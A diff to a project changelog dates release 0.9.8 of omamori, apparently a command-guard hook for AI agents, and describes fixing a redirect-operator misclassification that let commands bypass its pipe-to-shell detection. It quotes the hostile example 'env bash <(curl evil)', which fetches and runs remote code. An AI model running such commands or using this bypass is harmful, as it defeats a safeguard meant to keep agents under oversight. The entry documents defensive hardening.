@@ -4,7 +4,7 @@ All notable changes to this project will be documented in this file.
 
 The format is based on Keep a Changelog.
 
-## [0.9.8] - TBD
+## [0.9.8] - 2026-05-01
 
 **Summary**: Layer 2 redirect-axis closure ([#212](https://github.com/yottayoshida/omamori/issues/212)). The 2-boolean redirect classifier (`is_pure_redirect_op` / `is_concatenated_redirect`) carried in v0.9.5-v0.9.7 proved structurally insufficient under AI agent invocation: redirect operators with operand arity (e.g. `&>>` taking a file path operand) were misclassified as concatenated single-token redirects, letting downstream stdin-signal flags (`-s`) reach as if they were script paths and bypassing pipe-to-shell detection (Layer 2). v0.9.8 PR2 replaces both booleans with a single `RedirectToken::{PureWithOperand, Concatenated, NotRedirect}` enum carrying explicit `token_span()` arity, used uniformly across `unwrap_transparent`, `strip_leading_noise`, and the new arity-aware skip in `classify_shell_args`. Single-digit fd prefixes (`0<` ... `9>`, including `2<>file` etc.) are handled via `strip_single_fd_digit` reclassification, automatically closing the V-028 enumeration gap surfaced during plan loop. V-027 (proc-sub + transparent wrapper, e.g. `env bash <(curl evil)`) was confirmed already correct in v0.9.7 (the proc-sub guard in `process_segment` runs post-`unwrap_transparent`); v0.9.8 closes the test gap by adding 9 wrappers × proc-sub regression cases to `HOOK_DECISION_CASES`. Plus PR1 ([#213](https://github.com/yottayoshida/omamori/issues/213)) ACCEPTANCE_TEST.md AI-orchestrator framing rewrite landed earlier — the structural fix that closes the discovery gap that let v0.9.7 ship with #212 in the first place.
 
